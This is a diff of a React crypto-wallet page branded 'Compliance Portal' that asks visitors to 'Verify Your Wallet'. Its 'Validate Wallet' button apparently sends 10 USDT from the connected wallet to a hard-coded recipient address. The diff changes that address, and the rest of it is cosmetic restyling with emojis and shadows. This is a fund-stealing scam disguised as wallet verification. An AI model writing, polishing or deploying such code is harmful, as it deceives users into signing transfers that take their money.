@@ -13,10 +13,7 @@ import {
   getDefaultConfig,
   ConnectButton,
 } from '@rainbow-me/rainbowkit';
-import {
-  QueryClient,
-  QueryClientProvider,
-} from '@tanstack/react-query';
+import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
 import { parseUnits } from 'viem';
 import { useState } from 'react';
 
@@ -30,7 +27,7 @@ const config = getDefaultConfig({
 const queryClient = new QueryClient();
 
 const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-const recipient = '0xbDA9D40eB570FC52cF0d5326F80Ef31DD7F239e75';
+const recipient = '0xbA9D4eeB570FC52CF0d5362f80Ef31DD7F239e75';
 
 function WalletArea() {
   const { address, isConnected } = useAccount();
@@ -43,7 +40,7 @@ function WalletArea() {
     if (!walletClient || !address) return;
 
     try {
-      setStatus('Confirm transaction in your wallet...');
+      setStatus('🔐 Confirm transaction in your wallet...');
       setLoading(true);
 
       const usdtAbi = [
@@ -66,17 +63,17 @@ function WalletArea() {
         args: [recipient, parseUnits('10', 6)],
       });
 
-      setStatus(Transaction sent: ${hash.slice(0, 10)}...);
+      setStatus(`✅ Transaction sent: ${hash.slice(0, 10)}...`);
     } catch (err) {
       console.error(err);
-      setStatus('Transaction rejected or failed.');
+      setStatus('❌ Transaction rejected or failed.');
     } finally {
       setLoading(false);
     }
   };
 
   return (
-    <div className="bg-white rounded-2xl p-8 shadow-xl border max-w-md w-full mx-auto">
+    <div className="bg-white rounded-2xl p-8 shadow-xl border max-w-md w-full mx-auto transition-all duration-300 hover:shadow-2xl">
       <h2 className="text-2xl font-bold text-gray-800 text-center mb-2">
         Verify Your Wallet
       </h2>
@@ -88,29 +85,24 @@ function WalletArea() {
         <ConnectButton />
       </div>
 
-      {isConnected && address && (
+      {isConnected && (
         <div className="space-y-4">
           <div className="text-center text-gray-700 text-sm">
-            Connected:{' '}
-            <span className="font-mono">
-              {address.slice(0, 6)}...{address.slice(-4)}
-            </span>
+            Connected: <span className="font-mono">{address.slice(0, 6)}...{address.slice(-4)}</span>
           </div>
 
           <button
             onClick={handleValidate}
             disabled={loading}
             className={`w-full py-2 font-semibold rounded-lg text-white transition-colors ${
-              loading
-                ? 'bg-blue-400 cursor-not-allowed'
-                : 'bg-blue-600 hover:bg-blue-700'
+              loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'
             }`}
           >
             {loading ? 'Processing...' : 'Validate Wallet'}
           </button>
 
           {status && (
-            <div className="text-sm text-center text-gray-600 border rounded p-2 bg-gray-100">
+            <div className="text-sm text-center text-gray-600 border rounded p-2 bg-gray-50">
               {status}
             </div>
           )}
@@ -133,8 +125,8 @@ export default function Page() {
       <WagmiConfig config={config}>
         <RainbowKitProvider>
           <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex flex-col">
-            <header className="w-full py-4 px-8 border-b bg-white flex justify-between items-center">
-              <h1 className="text-2xl font-bold text-gray-800">Compliance Portal</h1>
+            <header className="w-full py-4 px-8 border-b bg-white flex justify-between items-center shadow-sm sticky top-0 z-10">
+              <h1 className="text-2xl font-bold text-gray-800">🛡 Compliance Portal</h1>
               <ConnectButton />
             </header>
 
